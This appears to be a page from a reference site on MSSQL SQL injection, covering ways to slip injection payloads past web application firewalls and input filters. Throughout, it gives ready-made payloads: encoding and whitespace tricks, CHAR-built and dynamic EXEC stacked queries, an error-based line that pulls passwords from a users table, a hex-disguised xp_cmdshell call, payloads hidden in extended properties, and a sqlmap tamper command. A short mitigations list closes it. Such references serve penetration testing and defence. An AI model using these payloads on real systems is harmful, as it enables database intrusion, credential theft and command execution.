---
title: Fuzzing and Obfuscation
description: Techniques for bypassing defenses in MSSQL injection
category: Advanced Techniques
order: 16
tags: ["obfuscation", "WAF bypass", "filter evasion"]
lastUpdated: 2026-10-08
---

Modern web applications often implement security measures like Web Application Firewalls (WAFs) and input filters to prevent SQL injection. Fuzzing and obfuscation techniques can help bypass these protections by disguising malicious SQL commands in ways that security tools may miss but the database will still execute.

## Comment Variations

Block comments can replace whitespace between tokens. They cannot split a keyword: `UN/**/ION` is two identifiers, not `UNION`.

```sql
-- Block comments as token separators
SELECT/*comment*/username,password/**/FROM/**/users

-- A line comment ends at the newline (no space needed after --)
SELECT --comment
username FROM users WHERE id = 1
```

## Whitespace Manipulation

SQL Server is flexible with whitespace, allowing creative formatting:

```sql
-- Using tabs, newlines, and carriage returns
SELECT
username
FROM
users

-- Excessive whitespace
SELECT       username       FROM       users
```

## Classic ASP Specific Obfuscation

In classic ASP, the `Request` object drops a `%` that does not start a valid escape sequence, so percent signs can be placed between characters to slip past filters that inspect the raw request. This is a property of classic ASP request decoding, not of ASP.NET or SQL Server:

```text
-- "SELECT" with % signs
S%E%L%E%C%T column FROM table

-- "AND 1=1" with % signs (and multiple % signs)
A%%ND 1=%%%%%%%%1
```

## Allowed Intermediary Characters (Whitespace)

SQL Server treats every character from `0x00` to `0x20` as whitespace, so any of them can replace a space (verified on SQL Server 2017, 2019 and 2022, which also accept `NCHAR(133)` and `NCHAR(160)`). `%00` only works when the application passes the null byte through (see [Comment Out Query](/mssql/comment-out-query)). In Unicode query text, `NCHAR(160)` (no-break space, `%C2%A0` in UTF-8) and `NCHAR(133)` (next line) are whitespace as well.

| Hex   | Description          |
| ----- | -------------------- |
| `%00` | Null                 |
| `%01` | Start of Heading     |
| `%02` | Start of Text        |
| `%03` | End of Text          |
| `%04` | End of Transmission  |
| `%05` | Enquiry              |
| `%06` | Acknowledge          |
| `%07` | Bell                 |
| `%08` | Backspace            |
| `%09` | Horizontal Tab       |
| `%0A` | New Line             |
| `%0B` | Vertical Tab         |
| `%0C` | Form Feed            |
| `%0D` | Carriage Return      |
| `%0E` | Shift Out            |
| `%0F` | Shift In             |
| `%10` | Data Link Escape     |
| `%11` | Device Control 1     |
| `%12` | Device Control 2     |
| `%13` | Device Control 3     |
| `%14` | Device Control 4     |
| `%15` | Negative Acknowledge |
| `%16` | Synchronous Idle     |
| `%17` | End of Trans. Block  |
| `%18` | Cancel               |
| `%19` | End of Medium        |
| `%1A` | Substitute           |
| `%1B` | Escape               |
| `%1C` | File Separator       |
| `%1D` | Group Separator      |
| `%1E` | Record Separator     |
| `%1F` | Unit Separator       |
| `%20` | Space                |

**Note:** `%25` (percent sign) is not whitespace but can be used for obfuscation in classic ASP applications (see the section above).

## Characters Avoiding Spaces

These characters can replace spaces in certain contexts:

| Character | Description  | Example                                                                          |
| --------- | ------------ | -------------------------------------------------------------------------------- |
| `"`       | Double quote | `SELECT"username"FROM"users"` (needs `QUOTED_IDENTIFIER ON`, the driver default) |
| `(` `)`   | Parentheses  | `UNION(SELECT(username)FROM users)` (a table name cannot be parenthesized)       |
| `[` `]`   | Brackets     | `SELECT[table_name]FROM[information_schema].[tables]`                            |

With `SET QUOTED_IDENTIFIER OFF`, which some older applications and drivers use, double quotes delimit string literals instead (`SELECT "it's"` returns `it's`), so a value placed inside `"..."` is broken out of with `"` rather than `'`.

## Characters After AND/OR

Besides the whitespace characters above, these characters can appear immediately after AND/OR (they start a numeric expression):

| Hex   | Character | Description |
| ----- | --------- | ----------- |
| `%2B` | `+`       | Plus        |
| `%2D` | `-`       | Minus       |
| `%2E` | `.`       | Period      |
| `%5C` | `\`       | Backslash   |
| `%7E` | `~`       | Tilde       |

Example (numeric context, no spaces):

```sql
1 AND\1=\1AND.1=.1AND-1=-1
```

## Case Variation

SQL Server keywords are case-insensitive:

```sql
select USERNAME from USERS where ID=1
SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
```

## Operator Alternatives

T-SQL has no logical `||` or `&&` and no `<=>` (those are MySQL). SQL Server 2025 adds `||`, but only for string concatenation, so `1=0 || 1=1` is still a syntax error. The alternatives rewrite the comparison instead:

```sql
-- Instead of id = 1
id IN (1)
id BETWEEN 1 AND 1
NOT id <> 1

-- Instead of OR 1=1 (string context)
' OR 'a' LIKE 'a
```

## String Representation

Strings can be represented in multiple ways:

```sql
-- Using CHAR function
SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110) -- 'admin'

-- Using NCHAR for Unicode
SELECT NCHAR(97) + NCHAR(100) + NCHAR(109) + NCHAR(105) + NCHAR(110) -- N'admin'

-- Using concatenation
SELECT 'ad' + 'min'

-- Hex literal: a varbinary value, so CAST it to varchar before comparing to text
SELECT CAST(0x61646D696E AS varchar(10)) -- 'admin'

-- String literals with N prefix (Unicode)
SELECT N'admin'
```

## Numeric Representation

Numbers can be represented in various ways:

```sql
-- Mathematical expressions
SELECT * FROM users WHERE id = 1+0

-- Subqueries
SELECT * FROM users WHERE id = (SELECT 1)

-- Hexadecimal (varbinary, implicitly converted to int)
SELECT * FROM users WHERE id = 0x1
```

## Keyword Obfuscation with Dynamic SQL

Keywords can be assembled at runtime and run with `EXEC()`. The built string runs as a separate batch, so this needs stacked queries and cannot extend the original query (a dynamic `UNION SELECT ...` on its own is a syntax error):

```sql
-- Using variables to build keywords
DECLARE @f varchar(100) = 'S' + 'ELECT'
EXEC(@f + ' * FROM users')

-- Using QUOTENAME to bracket an identifier
DECLARE @t varchar(100) = QUOTENAME('users')
EXEC('SELECT * FROM ' + @t)
```

## Using SQL Server-Specific Features

### Using Extended Stored Procedures

```sql
-- Calling xp_cmdshell without its name in the payload
-- (needs sysadmin and xp_cmdshell enabled; not available on SQL Server for Linux)
DECLARE @x varchar(100) = 0x78705F636D647368656C6C -- hex for 'xp_cmdshell'
EXEC('EXEC ' + @x + ' ''whoami''')
```

### Using Cast and Convert

```sql
-- 0x31 is the character '1': casting the binary straight to int gives 49, so go through varchar
SELECT * FROM users WHERE id = CAST(CAST(0x31 AS varchar(1)) AS int)

-- 0x01 is the integer 1
SELECT * FROM users WHERE id = CONVERT(int, 0x01)
```

## WAF Bypass Techniques

### Special Characters and Encodings

These encodings act on the HTTP layer; whether they reach SQL Server decoded depends on the web server and application:

```text
-- URL encoding (decoded once by the web server)
SELECT%20*%20FROM%20users

-- Double URL encoding (only if the application decodes a second time)
SELECT%2520*%2520FROM%2520users

-- %uXXXX encoding (decoded by IIS / classic ASP)
SELECT+%u0055NION+%u0053ELECT+1,2,3--
```

XML entity encoding only works when injecting into XML input (SOAP, XML web services) where an XML parser decodes entities before the value is used in SQL; it does not work for regular form or query string parameters:

```text
-- Decimal entities (1 UNION SELECT NULL becomes):
&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;

-- Hex entities (same payload):
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
```

#### Breaking Up Keywords

Comments cannot split a keyword in T-SQL (`UN/**/ION` is a syntax error); split the keyword in dynamic SQL instead (stacked query):

```sql
DECLARE @s varchar(10) = 'SEL' + 'ECT'
EXEC(@s + ' username FROM users')
```

#### Alternative Function Forms

```sql
-- DB_NAME() without an argument, or with DB_ID()
SELECT DB_NAME(DB_ID()) -- Current database

-- Using SUBSTRING instead of LEFT
SELECT SUBSTRING(name, 1, 3) FROM sys.databases -- Same as LEFT(name, 3)
```

### Practical SQL Injection Examples

#### WAF Bypass with Obfuscation

```text
-- Instead of: UNION SELECT 1,2,3 (URL-encoded letters; only helps if the filter does not decode)
' %55NION %53ELECT 1,2,3--

-- Instead of: SELECT @@version
' UNION %53ELECT %40%40version--
```

```sql
-- Instead of: OR 1=1 (string context)
' OR/**/'1'='1
```

#### Bypassing Keyword Filters

If 'SELECT' is blocked (string context, stacked query; the application must return the result of the extra statement for it to be visible):

```sql
-- Using character encoding
'; DECLARE @s nvarchar(100) = CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(70) + CHAR(82) + CHAR(79) + CHAR(77) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115); EXEC(@s)--
-- This builds and executes: SELECT * FROM users
```

If 'UNION' is blocked, dynamic SQL cannot help, because the built string cannot be attached to the original query. Use a technique that does not need `UNION`: error-based extraction (`' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`) or blind conditions (see [Conditional Statements](/mssql/conditional-statements)).

#### Advanced Evasion Examples

```sql
-- Using dynamic SQL and EXECUTE to avoid direct detection
'; DECLARE @q nvarchar(100); SET @q = 'SEL' + 'ECT * F' + 'ROM users'; EXEC(@q)--

-- Hiding the statement in an XML value and executing it
'; DECLARE @q varchar(100) = CAST('<a>SELECT * FROM users</a>' AS XML).value('/a[1]', 'varchar(100)'); EXEC(@q)--
```

### Automated Fuzzing

Tools like SQLMap include fuzzing capabilities to automatically test various bypass techniques:

```bash
sqlmap --url="http://target/page.php?id=1" --tamper=charencode,space2comment,randomcase --technique=U
```

### MSSQL-Specific Obfuscation Techniques

#### Using Built-in Functions

```sql
-- Using built-in functions instead of literals (two-column UNION, string context)
' UNION SELECT DB_NAME(), USER_NAME()--
```

#### Using SQL Server's Extended Properties

A payload can be stored as an extended property and executed later. `value` is `sql_variant`, so convert it before `EXEC`. Adding the property needs `ALTER` permission on the object, and it persists until dropped with `sp_dropextendedproperty`:

```sql
-- Hiding payload in extended properties
EXEC sp_addextendedproperty 'payload', 'SELECT * FROM users', 'SCHEMA', 'dbo', 'TABLE', 'users';
DECLARE @p nvarchar(4000); SELECT @p = CONVERT(nvarchar(4000), value) FROM sys.extended_properties WHERE name = 'payload'; EXEC(@p);
```

### Mitigations

To protect against obfuscation techniques:

1. Use parameterized queries instead of string concatenation
2. Implement a WAF with updated signatures that recognize obfuscation patterns
3. Use positive security models (whitelist valid patterns)
4. Limit the database user's privileges
5. Consider using an ORM that prevents direct SQL access
6. Monitor and rate-limit suspicious queries
7. Use SQL Server's built-in security features like Extended Events to monitor for unusual SQL patterns
